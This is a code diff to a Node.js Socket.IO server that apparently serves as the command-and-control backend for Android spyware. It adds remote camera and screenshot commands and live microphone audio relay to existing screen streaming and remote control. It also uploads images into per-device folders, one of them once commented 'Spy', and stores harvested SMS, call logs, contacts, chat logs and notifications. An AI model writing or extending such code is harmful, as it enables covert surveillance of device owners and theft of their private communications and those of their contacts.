@@ -6,22 +6,22 @@ const bodyParser = require('body-parser');
 const cloudinary = require('cloudinary').v2;
 const http = require('http'); 
 const { Server } = require("socket.io");
-const compression = require('compression'); // ✅ NEW: Fast Data Transfer
+const compression = require('compression'); // ✅ Fast Data Transfer
 
 const app = express();
 const server = http.createServer(app);
 const PORT = process.env.PORT || 3000;
 
-// ✅ 1. OPTIMIZED SOCKET.IO SETUP (Fast & Stable)
+// ✅ 1. OPTIMIZED SOCKET.IO SETUP
 const io = new Server(server, {
     cors: {
         origin: "*",
         methods: ["GET", "POST"]
     },
-    maxHttpBufferSize: 1e8, // 100MB for heavy data
-    pingTimeout: 60000,     // Connection stable rakhne ke liye
-    pingInterval: 25000,    // Har 25 sec me check karega
-    transports: ['websocket', 'polling'] // Force Websocket for speed
+    maxHttpBufferSize: 1e8, // 100MB (Audio/Image ke liye zaroori)
+    pingTimeout: 60000,     
+    pingInterval: 25000,    
+    transports: ['websocket', 'polling']
 });
 
 // --- CLOUDINARY CONFIG ---
@@ -35,7 +35,7 @@ cloudinary.config({
 const UPLOADS_DIR = path.join(__dirname, 'uploads');
 if (!fs.existsSync(UPLOADS_DIR)) fs.mkdirSync(UPLOADS_DIR);
 
-app.use(compression()); // ✅ Gzip Compression (Makes responses 70% smaller/faster)
+app.use(compression()); 
 app.use(cors({ origin: '*' }));
 app.use(bodyParser.json({ limit: '100mb' }));
 app.use(bodyParser.urlencoded({ limit: '100mb', extended: true }));
@@ -44,23 +44,52 @@ app.use(express.static(__dirname));
 // Live Status (RAM Storage)
 let devicesStatus = {}; 
 
-// --- 2. FAST SOCKET LOGIC ---
+// ==================================================
+//  🔥 MAIN SOCKET LOGIC (Fixed for Camera & Audio)
+// ==================================================
 io.on('connection', (socket) => {
     // console.log('🔌 New Connection:', socket.id);
 
+    // 1. Join Room (Device & Admin both use this)
     socket.on('join', (roomID) => {
         socket.join(roomID);
         // console.log(`🔗 Joined: ${roomID}`);
     });
 
-    // Device -> Admin (Screen Share)
+    // 2. Screen Share (Device -> Admin)
     socket.on('screen-data', (data) => {
         socket.volatile.to(data.room).emit('screen-data', data.image);
     });
 
-    // Admin -> Device (Control)
+    // 3. Control Events (Admin -> Device)
+    // Ye 'Scroll', 'Click' aur 'Start-Mic' handle karega
     socket.on('control-event', (data) => {
+        // Data format: { room: "DEVICE_ID", action: "start-mic" }
         socket.to(data.room).emit('control-event', data);
+    });
+
+    // 🔥 FIX 1: CAMERA & SCREENSHOT COMMANDS
+    // HTML Button -> Server -> Android
+    socket.on('send-command', (data) => {
+        // console.log("📥 Command received:", data);
+        if (data.targetId && data.command) {
+            io.to(data.targetId).emit('command', data.command);
+            
+            // Status update
+            if(devicesStatus[data.targetId]) {
+                devicesStatus[data.targetId].command = data.command;
+            }
+        }
+    });
+
+    // 🔥 FIX 2: AUDIO STREAM RELAY
+    // Android (Mic) -> Server -> HTML (Speaker)
+    socket.on('audio-stream', (data) => {
+        // Android bhejega: { room: "DEVICE_ID", data: <BinaryData> }
+        if (data.room && data.data) {
+            // Hum sirf Binary Data forward karenge HTML player ko
+            socket.to(data.room).emit('audio-stream', data.data);
+        }
     });
 
     socket.on('disconnect', () => {
@@ -69,37 +98,30 @@ io.on('connection', (socket) => {
 });
 
 app.get('/', (req, res) => {
-    res.send('✅ Fast Server is Running!');
+    res.send('✅ Server is Running with Camera & Audio Support!');
 });
 
 // ==================================================
-//  ✅ INTELLIGENT UPLOAD SYSTEM (UPDATED FOR TYPE)
+//  ✅ UPLOAD SYSTEM (Images/Camera/Screenshots)
 // ==================================================
 
 app.post('/api/upload-image', (req, res) => {
-    // Android se teeno cheezein aayengi
     let { device_id, image_data, type } = req.body; 
     
     if (!device_id || !image_data) return res.status(400).json({ error: "No Data" });
 
     const id = device_id.toString().trim().toUpperCase();
     
-    // 🔥 LOGIC: Folder Selection
-    // Agar type "front_camera" hai to folder banega: DEVICE_ID/front_camera
-    // Agar type null hai (Gallery), to folder banega: DEVICE_ID
     let folderPath = id;
-    
     if (type && type !== "null" && type !== "") {
-        folderPath = `${id}/${type}`; // Sub-folder for Spy/Screen
+        folderPath = `${id}/${type}`; 
     }
 
-    // Base64 fix
     let base64Image = image_data.startsWith('data:image') ? image_data : "data:image/jpeg;base64," + image_data;
 
-    // Cloudinary Upload
     cloudinary.uploader.upload(base64Image, 
         { 
-            folder: folderPath, // ✅ Dynamic Folder Name here
+            folder: folderPath, 
             public_id: Date.now().toString(), 
             resource_type: "image", 
             width: 1280, 
@@ -112,7 +134,7 @@ app.post('/api/upload-image', (req, res) => {
                 return res.status(500).json({ error: "Upload Failed" });
             }
             
-            // Socket se Admin ko bata do
+            // Socket se Admin ko bata do ki photo aa gayi
             io.emit('new-file', { device_id: id, url: result.secure_url, type: type || 'gallery' });
             
             res.json({ status: "success", url: result.secure_url });
@@ -124,8 +146,6 @@ app.get('/api/gallery-list/:device_id', (req, res) => {
     const id = req.params.device_id.toUpperCase();
     const next_cursor = req.query.next_cursor || null;
 
-    // By default ye root folder (Gallery) dikhayega
-    // Agar future me sub-folders dikhane hain to prefix change kar sakte ho
     cloudinary.api.resources({
         type: 'upload', prefix: id + "/", max_results: 20, next_cursor: next_cursor, direction: 'desc', context: true
     }, 
@@ -184,6 +204,7 @@ app.post('/api/status', (req, res) => {
     }
 });
 
+// API Fallback for Commands (Optional, but kept for safety)
 app.post('/api/send-command', (req, res) => {
     let { device_id, command } = req.body;
     if (!device_id || !command) return res.status(400).json({ error: "Missing Info" });
@@ -198,7 +219,7 @@ app.post('/api/send-command', (req, res) => {
 });
 
 // ==================================================
-//  🔥 FAST ASYNC DATA STORAGE (Non-Blocking)
+//  🔥 DATA STORAGE (SMS, Logs, etc.)
 // ==================================================
 
 app.post('/api/upload_data', async (req, res) => { 
@@ -221,7 +242,6 @@ app.post('/api/upload_data', async (req, res) => {
             }
         }
 
-        // Logic for Appending Data
         let finalData = parsedData;
 
         if (['notifications', 'sms', 'call_logs', 'contacts', 'chat_logs'].includes(type)) {
@@ -230,7 +250,7 @@ app.post('/api/upload_data', async (req, res) => {
             try {
                 const fileContent = await fs.promises.readFile(filePath, 'utf8');
                 existingData = JSON.parse(fileContent);
-            } catch (e) { /* File nahi mili to koi baat nahi */ }
+            } catch (e) { }
 
             let newDataArray = Array.isArray(parsedData) ? parsedData : [parsedData];
             
